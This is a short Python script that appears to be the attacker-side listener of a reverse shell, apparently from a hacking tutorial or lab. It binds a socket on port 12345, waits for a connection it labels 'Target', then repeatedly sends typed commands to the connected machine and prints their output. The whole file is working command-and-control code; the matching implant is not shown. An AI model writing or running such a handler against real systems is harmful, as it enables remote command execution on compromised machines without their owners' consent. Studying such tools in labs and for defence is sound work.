#!/usr/bin/python3
import json
import socket


def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())


def reliable_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + target.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue


def shell():
    while True:
        # SEND AND RECEIVE COMMANDS
        command = input("* Shell#~%s: " % str(ip))
        reliable_send(command)
        if command == "q":
            break
        else:
            result = reliable_recv()
            print(result)


def server():
    global s
    global ip
    global target

    # CREATES THE SOCKET
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # BIND PORT
    s.bind(("127.0.0.1", 12345))
    s.listen(1)
    print("Listening for incoming connections...")

    # ACCEPT CONNECTION
    target, ip = s.accept()
    print("Target Connected!")

server()
shell()
s.close()